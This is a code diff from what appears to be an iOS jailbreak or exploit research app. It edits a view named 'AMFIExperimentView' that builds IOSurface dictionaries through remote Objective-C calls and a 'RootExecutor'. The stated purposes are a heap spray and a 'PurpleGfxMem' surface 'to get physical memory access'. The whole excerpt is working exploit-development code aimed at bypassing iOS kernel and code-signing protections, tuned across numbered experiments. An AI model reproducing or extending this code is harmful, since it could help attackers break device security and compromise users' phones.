@@ -3270,19 +3270,12 @@ struct AMFIExperimentView: View {
         let numWithInt = remote_sel(sb, "numberWithInteger:")
         
         // Create a small IOSurface (we'll use its properties for spraying)
+        // Using EXACT same format as exp 68 which works
         let sprayDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
-        remote_msg(sb, sprayDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 0x1000, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
-        remote_msg(sb, sprayDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
-        remote_msg(sb, sprayDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
-        remote_msg(sb, sprayDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
         
         let spraySurface = RootExecutor.rcall(sb, "IOSurfaceCreate", sprayDict)
         detail += "Spray surface: 0x\(String(format: "%llx", spraySurface))\n"
@@ -3420,25 +3413,11 @@ struct AMFIExperimentView: View {
         
         // Create a PurpleGfxMem surface to get physical memory access
         let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
-        remote_msg(sb, gfxDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 0x100000, 0, 0, 0),  // 1MB
-                   remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
-        remote_msg(sb, gfxDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 1024, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
-        remote_msg(sb, gfxDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
-        remote_msg(sb, gfxDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
-        // PurpleGfxMem = physically contiguous
-        remote_msg(sb, gfxDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 1, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceNonPurgeable"), 0, 0)
-        remote_msg(sb, gfxDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 1, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfacePurgeWhenNotInUse"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
         
         let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
         
